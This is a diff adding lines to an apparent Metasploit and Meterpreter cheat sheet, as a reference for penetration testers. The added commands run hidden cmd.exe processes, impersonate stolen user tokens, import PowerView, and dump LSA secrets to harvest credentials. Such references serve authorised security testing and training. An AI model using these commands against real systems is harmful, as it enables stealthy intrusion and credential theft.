@@ -3,6 +3,12 @@ Port Forwarding----portfwd add -l 1111 -p 22 -r Target2
 Screenshot----screenshot -p file.jpg
 Idle Time----idletime
 Disable/Enable Mouse----uictl
+Execute a command (interact with process / create a hidden process)----execute -f cmd.exe -i -H
+Execute a command with arguments----execute -f cmd.exe -H -a "/c net users"
+Impersonate a User Token----##load incognito; list tokens -u; impersonate_token '&lt;domain\user&gt;'
+Spawn Process as Impersonated User----execute -f cmd.exe -i -H -t 
+Powershell Execute (load powershell)----powershell_execute "Get-ChildItem C:\Users\user -Recurse"
+Powershell Import----powershell_import /path/to/powerview.ps1
 
 ##msfconsole
 Immediately Background Sessions----exploit -j
@@ -11,3 +17,6 @@ Immediately Background Sessions----exploit -j
 ##msfvenom
 List Payloads----msfvenom --list payloads
 Payload Types----asp, perl, jsp, python, jar, php, linux (elf), windows (exe, dll, ps1, psh-cmd)
+
+##Modules
+windows/gather/lsa_secrets----Dumps LSA Secrets.  You can also use Kiwi's lsa_dump_secrets (probably better).
